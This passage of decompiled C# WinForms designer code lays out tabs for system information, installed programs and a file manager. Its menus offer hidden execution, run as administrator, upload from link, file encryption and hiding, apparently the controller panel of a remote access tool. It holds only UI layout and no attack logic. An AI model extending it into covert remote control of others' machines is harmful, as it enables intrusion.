        this.ListInfo.ContextMenuStrip = this.ContexMuneInfo;
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListInfo.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListInfo.EnableHeadersVisualStyles = false;
        this.ListInfo.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListInfo.Location = new System.Drawing.Point(16, 106);
        this.ListInfo.Name = "ListInfo";
        this.ListInfo.RowHeadersVisible = false;
        this.ListInfo.RowHeadersWidth = 27;
        this.ListInfo.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListInfo.ShowCellErrors = false;
        this.ListInfo.ShowEditingIcon = false;
        this.ListInfo.ShowRowErrors = false;
        this.ListInfo.Size = new System.Drawing.Size(705, 346);
        this.ListInfo.TabIndex = 657;
        this.ListInfo.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListInfo.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListInfo.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListInfo.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListInfo.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListInfo.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListInfo.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListInfo.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListInfo.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListInfo.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListInfo.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListInfo.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListInfo.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListInfo.ThemeStyle.HeaderStyle.Height = 30;
        this.ListInfo.ThemeStyle.ReadOnly = false;
        this.ListInfo.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListInfo.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListInfo.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListInfo.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListInfo.ThemeStyle.RowsStyle.Height = 22;
        this.ListInfo.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListInfo.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.Column2.DefaultCellStyle = dataGridViewCellStyle4;
        this.Column2.HeaderText = "Name";
        this.Column2.Name = "Column2";
        this.Column2.Width = 68;
        this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column3.HeaderText = "Value";
        this.Column3.Name = "Column3";
        this.ContexMuneInfo.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.saveToolStripMenuItem });
        this.ContexMuneInfo.Name = "ContexMuneInfo";
        this.ContexMuneInfo.Size = new System.Drawing.Size(99, 26);
        this.saveToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.saveToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("saveToolStripMenuItem.Image");
        this.saveToolStripMenuItem.Name = "saveToolStripMenuItem";
        this.saveToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
        this.saveToolStripMenuItem.Text = "Save";
        this.saveToolStripMenuItem.Click += new System.EventHandler(saveToolStripMenuItem_Click);
        this.DownTypeInfo.BackColor = System.Drawing.Color.Transparent;
        this.DownTypeInfo.BackgroundColor = System.Drawing.Color.White;
        this.DownTypeInfo.BorderColor = System.Drawing.Color.Silver;
        this.DownTypeInfo.BorderRadius = 1;
        this.DownTypeInfo.Color = System.Drawing.Color.Silver;
        this.DownTypeInfo.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.DownTypeInfo.DisabledBackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.DownTypeInfo.DisabledBorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        this.DownTypeInfo.DisabledColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.DownTypeInfo.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        this.DownTypeInfo.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.DownTypeInfo.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.DownTypeInfo.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.DownTypeInfo.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.DownTypeInfo.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.DownTypeInfo.FillDropDown = true;
        this.DownTypeInfo.FillIndicator = false;
        this.DownTypeInfo.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.DownTypeInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.DownTypeInfo.ForeColor = System.Drawing.Color.Black;
        this.DownTypeInfo.FormattingEnabled = true;
        this.DownTypeInfo.Icon = null;
        this.DownTypeInfo.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.DownTypeInfo.IndicatorColor = System.Drawing.Color.DarkGray;
        this.DownTypeInfo.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.DownTypeInfo.IndicatorThickness = 2;
        this.DownTypeInfo.IsDropdownOpened = false;
        this.DownTypeInfo.ItemBackColor = System.Drawing.Color.White;
        this.DownTypeInfo.ItemBorderColor = System.Drawing.Color.White;
        this.DownTypeInfo.ItemForeColor = System.Drawing.Color.Black;
        this.DownTypeInfo.ItemHeight = 20;
        this.DownTypeInfo.ItemHighLightColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DownTypeInfo.ItemHighLightForeColor = System.Drawing.Color.White;
        this.DownTypeInfo.Items.AddRange(new object[7] { "Disk Drive", "Operating System", "Processor", "Computer System", "Startup Command", "ProgramGroup", "System Devices" });
        this.DownTypeInfo.ItemTopMargin = 3;
        this.DownTypeInfo.Location = new System.Drawing.Point(16, 32);
        this.DownTypeInfo.Name = "DownTypeInfo";
        this.DownTypeInfo.Size = new System.Drawing.Size(242, 26);
        this.DownTypeInfo.TabIndex = 641;
        this.DownTypeInfo.Text = null;
        this.DownTypeInfo.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.DownTypeInfo.TextLeftMargin = 5;
        this.label7.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label7.AutoSize = true;
        this.label7.BackColor = System.Drawing.Color.Transparent;
        this.label7.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label7.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label7.ForeColor = System.Drawing.Color.Gray;
        this.label7.Location = new System.Drawing.Point(16, 12);
        this.label7.Name = "label7";
        this.label7.Size = new System.Drawing.Size(31, 15);
        this.label7.TabIndex = 642;
        this.label7.Text = "Type";
        this.PageInstall.Controls.Add(this.Panel2);
        this.PageInstall.Location = new System.Drawing.Point(4, 4);
        this.PageInstall.Name = "PageInstall";
        this.PageInstall.Size = new System.Drawing.Size(737, 465);
        this.PageInstall.TabIndex = 9;
        this.PageInstall.Text = "Installed";
        this.PageInstall.UseVisualStyleBackColor = true;
        this.Panel2.Controls.Add(this.ListInstalled);
        this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel2.Location = new System.Drawing.Point(0, 0);
        this.Panel2.Name = "Panel2";
        this.Panel2.Size = new System.Drawing.Size(737, 465);
        this.Panel2.TabIndex = 1;
        this.ListInstalled.AllowUserToAddRows = false;
        this.ListInstalled.AllowUserToDeleteRows = false;
        this.ListInstalled.AllowUserToResizeColumns = false;
        this.ListInstalled.AllowUserToResizeRows = false;
        dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListInstalled.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle5;
        this.ListInstalled.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListInstalled.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListInstalled.BackgroundColor = System.Drawing.Color.White;
        this.ListInstalled.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListInstalled.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListInstalled.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListInstalled.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle6.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListInstalled.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle6;
        this.ListInstalled.ColumnHeadersHeight = 30;
        this.ListInstalled.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListInstalled.Columns.AddRange(this.Column1, this.dataGridViewTextBoxColumn2);
        this.ListInstalled.ContextMenuStrip = this.ContexMuneInstalled;
        dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle7.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle7.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle7.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListInstalled.DefaultCellStyle = dataGridViewCellStyle7;
        this.ListInstalled.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListInstalled.EnableHeadersVisualStyles = false;
        this.ListInstalled.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListInstalled.Location = new System.Drawing.Point(0, 0);
        this.ListInstalled.Name = "ListInstalled";
        this.ListInstalled.ReadOnly = true;
        this.ListInstalled.RowHeadersVisible = false;
        this.ListInstalled.RowHeadersWidth = 27;
        this.ListInstalled.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListInstalled.ShowCellErrors = false;
        this.ListInstalled.ShowEditingIcon = false;
        this.ListInstalled.ShowRowErrors = false;
        this.ListInstalled.Size = new System.Drawing.Size(737, 465);
        this.ListInstalled.TabIndex = 658;
        this.ListInstalled.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListInstalled.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListInstalled.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListInstalled.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListInstalled.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListInstalled.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListInstalled.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListInstalled.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListInstalled.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListInstalled.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListInstalled.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListInstalled.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListInstalled.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListInstalled.ThemeStyle.HeaderStyle.Height = 30;
        this.ListInstalled.ThemeStyle.ReadOnly = true;
        this.ListInstalled.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListInstalled.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListInstalled.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListInstalled.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListInstalled.ThemeStyle.RowsStyle.Height = 22;
        this.ListInstalled.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListInstalled.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.Column1.HeaderText = "";
        this.Column1.Name = "Column1";
        this.Column1.ReadOnly = true;
        this.Column1.Width = 5;
        this.dataGridViewTextBoxColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn2.DefaultCellStyle = dataGridViewCellStyle8;
        this.dataGridViewTextBoxColumn2.HeaderText = "Name";
        this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
        this.dataGridViewTextBoxColumn2.ReadOnly = true;
        this.ContexMuneInstalled.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.refreshToolStripMenuItem, this.unistallToolStripMenuItem });
        this.ContexMuneInstalled.Name = "ContexMuneInstalled";
        this.ContexMuneInstalled.Size = new System.Drawing.Size(114, 48);
        this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
        this.refreshToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
        this.refreshToolStripMenuItem.Text = "Refresh";
        this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
        this.unistallToolStripMenuItem.Name = "unistallToolStripMenuItem";
        this.unistallToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
        this.unistallToolStripMenuItem.Text = "Unistall";
        this.unistallToolStripMenuItem.Click += new System.EventHandler(unistallToolStripMenuItem_Click);
        this.PageFileManager.Controls.Add(this.Panel3);
        this.PageFileManager.Location = new System.Drawing.Point(4, 4);
        this.PageFileManager.Name = "PageFileManager";
        this.PageFileManager.Size = new System.Drawing.Size(737, 465);
        this.PageFileManager.TabIndex = 1;
        this.PageFileManager.Text = "Files";
        this.PageFileManager.UseVisualStyleBackColor = true;
        this.Panel3.Controls.Add(this.PanelListFileManager);
        this.Panel3.Controls.Add(this.PanelTitleFileManager);
        this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel3.Location = new System.Drawing.Point(0, 0);
        this.Panel3.Name = "Panel3";
        this.Panel3.Size = new System.Drawing.Size(737, 465);
        this.Panel3.TabIndex = 1;
        this.PanelListFileManager.Controls.Add(this.AeroListView1);
        this.PanelListFileManager.Controls.Add(this.AreListview2);
        this.PanelListFileManager.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelListFileManager.Location = new System.Drawing.Point(0, 81);
        this.PanelListFileManager.Name = "PanelListFileManager";
        this.PanelListFileManager.Size = new System.Drawing.Size(737, 384);
        this.PanelListFileManager.TabIndex = 614;
        this.AeroListView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.AeroListView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader2 });
        this.AeroListView1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.AeroListView1.FullRowSelect = true;
        listViewGroup.Header = "Folder";
        listViewGroup.Name = "Folder";
        listViewGroup2.Header = "Devices and Drives";
        listViewGroup2.Name = "Devices and Drives";
        this.AeroListView1.Groups.AddRange(new System.Windows.Forms.ListViewGroup[2] { listViewGroup, listViewGroup2 });
        this.AeroListView1.HideSelection = false;
        this.AeroListView1.LargeImageList = this.MG;
        this.AeroListView1.Location = new System.Drawing.Point(0, 0);
        this.AeroListView1.Name = "AeroListView1";
        this.AeroListView1.Size = new System.Drawing.Size(737, 384);
        this.AeroListView1.SmallImageList = this.imageList1;
        this.AeroListView1.TabIndex = 612;
        this.AeroListView1.UseCompatibleStateImageBehavior = false;
        this.AeroListView1.View = System.Windows.Forms.View.Tile;
        this.AeroListView1.DoubleClick += new System.EventHandler(AeroListView1_DoubleClick);
        this.columnHeader1.Text = "Size";
        this.MG.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("MG.ImageStream");
        this.MG.TransparentColor = System.Drawing.Color.FromArgb(7, 11, 41);
        this.MG.Images.SetKeyName(0, "Folder.ico");
        this.MG.Images.SetKeyName(1, "Disk.ico");
        this.MG.Images.SetKeyName(2, "DVD.ico");
        this.MG.Images.SetKeyName(3, "usb.ico");
        this.MG.Images.SetKeyName(4, "DiskNetwork.ico");
        this.MG.Images.SetKeyName(5, "Desktop.ico");
        this.MG.Images.SetKeyName(6, "Pictures.ico");
        this.MG.Images.SetKeyName(7, "Videos.ico");
        this.MG.Images.SetKeyName(8, "Documents.ico");
        this.MG.Images.SetKeyName(9, "DolderDownload.ico");
        this.MG.Images.SetKeyName(10, "DiskC.ico");
        this.MG.Images.SetKeyName(11, "Backs.png");
        this.MG.Images.SetKeyName(12, "FileEmty.png");
        this.MG.Images.SetKeyName(13, "Music.ico");
        this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
        this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
        this.imageList1.Images.SetKeyName(0, "Folders.ico");
        this.AreListview2.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.AreListview2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.ColName, this.ColDate, this.ColType, this.ColSize });
        this.AreListview2.ContextMenuStrip = this.CountexMuneFiles;
        this.AreListview2.Dock = System.Windows.Forms.DockStyle.Fill;
        this.AreListview2.FullRowSelect = true;
        listViewGroup3.Header = "Folder";
        listViewGroup3.Name = "Folder";
        listViewGroup4.Header = "Devices and Drives";
        listViewGroup4.Name = "Devices and Drives";
        this.AreListview2.Groups.AddRange(new System.Windows.Forms.ListViewGroup[2] { listViewGroup3, listViewGroup4 });
        this.AreListview2.HideSelection = false;
        this.AreListview2.LargeImageList = this.imageList1;
        this.AreListview2.Location = new System.Drawing.Point(0, 0);
        this.AreListview2.Name = "AreListview2";
        this.AreListview2.Size = new System.Drawing.Size(737, 384);
        this.AreListview2.SmallImageList = this.imageList1;
        this.AreListview2.TabIndex = 611;
        this.AreListview2.UseCompatibleStateImageBehavior = false;
        this.AreListview2.View = System.Windows.Forms.View.Details;
        this.AreListview2.ItemSelectionChanged += new System.Windows.Forms.ListViewItemSelectionChangedEventHandler(AreListview2_ItemSelectionChanged);
        this.AreListview2.DoubleClick += new System.EventHandler(AreListview2_DoubleClick);
        this.ColName.Text = "Name";
        this.ColName.Width = 115;
        this.ColDate.Text = "Date modifed";
        this.ColDate.Width = 113;
        this.ColType.Text = "Type";
        this.ColType.Width = 261;
        this.ColSize.Text = "Size";
        this.ColSize.Width = 109;
        this.CountexMuneFiles.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.CountexMuneFiles.Items.AddRange(new System.Windows.Forms.ToolStripItem[19]
        {
            this.openToolStripMenuItem, this.refreshToolStripMenuItem1, this.AddArchiveToolStripMenuItem, this.ExtractHereToolStripMenuItem, this.FilesEncrypToolStripMenuItem, this.FolderLockToolStripMenuItem, this.UploadToolStripMenuItem, this.DownloadToolStripMenuItem, this.UploadFromLinkToolStripMenuItem, this.RenameToolStripMenuItem,
            this.EditorToolStripMenuItem, this.CopyToolStripMenuItem, this.CutToolStripMenuItem, this.PasteToolStripMenuItem, this.NewToolStripMenuItem, this.HideToolStripMenuItem, this.ShowToolStripMenuItem, this.DeleteToolStripMenuItem, this.OpenDownloadFolderToolStripMenuItem
        });
        this.CountexMuneFiles.Name = "CountexMuneFiles";
        this.CountexMuneFiles.Size = new System.Drawing.Size(201, 498);
        this.openToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.openToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.NormalToolStripMenuItem, this.HidenToolStripMenuItem, this.RunAsAdministratorToolStripMenuItem });
        this.openToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("openToolStripMenuItem.Image");
        this.openToolStripMenuItem.Name = "openToolStripMenuItem";
        this.openToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.openToolStripMenuItem.Text = "Open";
        this.NormalToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.NormalToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("NormalToolStripMenuItem.Image");
        this.NormalToolStripMenuItem.Name = "NormalToolStripMenuItem";
        this.NormalToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
        this.NormalToolStripMenuItem.Text = "Normal";
        this.NormalToolStripMenuItem.Click += new System.EventHandler(NormalToolStripMenuItem_Click);
        this.HidenToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.HidenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HidenToolStripMenuItem.Image");
        this.HidenToolStripMenuItem.Name = "HidenToolStripMenuItem";
        this.HidenToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
        this.HidenToolStripMenuItem.Text = "Hidden";
        this.HidenToolStripMenuItem.Click += new System.EventHandler(HidenToolStripMenuItem_Click);
        this.RunAsAdministratorToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.RunAsAdministratorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RunAsAdministratorToolStripMenuItem.Image");
        this.RunAsAdministratorToolStripMenuItem.Name = "RunAsAdministratorToolStripMenuItem";
        this.RunAsAdministratorToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
        this.RunAsAdministratorToolStripMenuItem.Text = "Run as administrator";
        this.RunAsAdministratorToolStripMenuItem.Click += new System.EventHandler(RunAsAdministratorToolStripMenuItem_Click);
        this.refreshToolStripMenuItem1.BackColor = System.Drawing.Color.White;
        this.refreshToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("refreshToolStripMenuItem1.Image");
        this.refreshToolStripMenuItem1.Name = "refreshToolStripMenuItem1";
        this.refreshToolStripMenuItem1.Size = new System.Drawing.Size(200, 26);
        this.refreshToolStripMenuItem1.Text = "Refresh";
        this.refreshToolStripMenuItem1.Click += new System.EventHandler(refreshToolStripMenuItem1_Click);
        this.AddArchiveToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.AddArchiveToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("AddArchiveToolStripMenuItem.Image");
        this.AddArchiveToolStripMenuItem.Name = "AddArchiveToolStripMenuItem";
        this.AddArchiveToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.AddArchiveToolStripMenuItem.Text = "Add Archive";
        this.AddArchiveToolStripMenuItem.Click += new System.EventHandler(AddArchiveToolStripMenuItem_Click);
        this.ExtractHereToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.ExtractHereToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ExtractHereToolStripMenuItem.Image");
        this.ExtractHereToolStripMenuItem.Name = "ExtractHereToolStripMenuItem";
        this.ExtractHereToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.ExtractHereToolStripMenuItem.Text = "Extract Here";
        this.ExtractHereToolStripMenuItem.Click += new System.EventHandler(ExtractHereToolStripMenuItem_Click);
        this.FilesEncrypToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.FilesEncrypToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EncryptToolStripMenuItem, this.DecryptToolStripMenuItem });
        this.FilesEncrypToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FilesEncrypToolStripMenuItem.Image");
        this.FilesEncrypToolStripMenuItem.Name = "FilesEncrypToolStripMenuItem";
        this.FilesEncrypToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.FilesEncrypToolStripMenuItem.Text = "Files Encryp";
        this.EncryptToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.EncryptToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("EncryptToolStripMenuItem.Image");
        this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
        this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
        this.EncryptToolStripMenuItem.Text = "Encrypt";
        this.EncryptToolStripMenuItem.Click += new System.EventHandler(EncryptToolStripMenuItem_Click);
        this.DecryptToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.DecryptToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DecryptToolStripMenuItem.Image");
        this.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem";
        this.DecryptToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
        this.DecryptToolStripMenuItem.Text = "Decrypt";
        this.DecryptToolStripMenuItem.Click += new System.EventHandler(DecryptToolStripMenuItem_Click);
        this.FolderLockToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.FolderLockToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.LockToolStripMenuItem, this.UnlockToolStripMenuItem });
        this.FolderLockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FolderLockToolStripMenuItem.Image");
        this.FolderLockToolStripMenuItem.Name = "FolderLockToolStripMenuItem";
        this.FolderLockToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.FolderLockToolStripMenuItem.Text = "Folder Lock";
        this.LockToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.LockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LockToolStripMenuItem.Image");
        this.LockToolStripMenuItem.Name = "LockToolStripMenuItem";
        this.LockToolStripMenuItem.Size = new System.Drawing.Size(111, 22);
        this.LockToolStripMenuItem.Text = "Lock";
        this.LockToolStripMenuItem.Click += new System.EventHandler(LockToolStripMenuItem_Click);
        this.UnlockToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.UnlockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UnlockToolStripMenuItem.Image");
        this.UnlockToolStripMenuItem.Name = "UnlockToolStripMenuItem";
        this.UnlockToolStripMenuItem.Size = new System.Drawing.Size(111, 22);
        this.UnlockToolStripMenuItem.Text = "Unlock";
        this.UnlockToolStripMenuItem.Click += new System.EventHandler(UnlockToolStripMenuItem_Click);
        this.UploadToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.UploadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UploadToolStripMenuItem.Image");
        this.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem";
        this.UploadToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.UploadToolStripMenuItem.Text = "Upload";
        this.UploadToolStripMenuItem.Click += new System.EventHandler(uploadToolStripMenuItem_Click);
        this.DownloadToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.DownloadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DownloadToolStripMenuItem.Image");
        this.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem";
        this.DownloadToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.DownloadToolStripMenuItem.Text = "Download";
        this.DownloadToolStripMenuItem.Click += new System.EventHandler(downloadToolStripMenuItem_Click);
        this.UploadFromLinkToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.UploadFromLinkToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UploadFromLinkToolStripMenuItem.Image");
        this.UploadFromLinkToolStripMenuItem.Name = "UploadFromLinkToolStripMenuItem";
        this.UploadFromLinkToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.UploadFromLinkToolStripMenuItem.Text = "Upload From Link ";
